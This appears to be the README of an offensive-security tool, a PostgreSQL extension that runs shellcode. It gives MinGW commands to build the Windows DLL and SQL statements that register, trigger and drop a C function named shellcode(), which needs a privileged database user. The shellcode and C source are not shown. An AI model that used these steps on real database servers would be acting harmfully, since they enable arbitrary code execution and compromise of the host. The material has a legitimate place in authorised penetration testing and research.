# Postgres Shellcode Execute Extension

More information: https://www.phrozen.io/resources/paper/41df297b-cfe3-43ec-88e8-0686e5548dd5

## Compile Extension (Mingw 64bit / Microsoft Windows)

### Postgresql 13.1 (Adapt with your version)

`x86_64-w64-mingw32-gcc.exe PgShellcodeExt.c -c -o PgShellcodeExt.o -I "C:\Program Files\PostgreSQL\13\include" -I "C:\Program Files\PostgreSQL\13\include\server" -I "C:\Program Files\PostgreSQL\13\include\server\port\win32"`

`x86_64-w64-mingw32-gcc.exe -o PgShellcodeExt.dll -s -shared PgShellcodeExt.o -Wl,--subsystem,windows`

### Register and execute extension (Requires privileged postgres user)

```
-- Register new function
CREATE OR REPLACE FUNCTION shellcode() RETURNS void AS 'PgShellcodeExt.dll', 'shellcode' LANGUAGE C STRICT;

-- Trigger function
SELECT shellcode();

-- Delete function
DROP FUNCTION IF EXISTS shellcode;
```

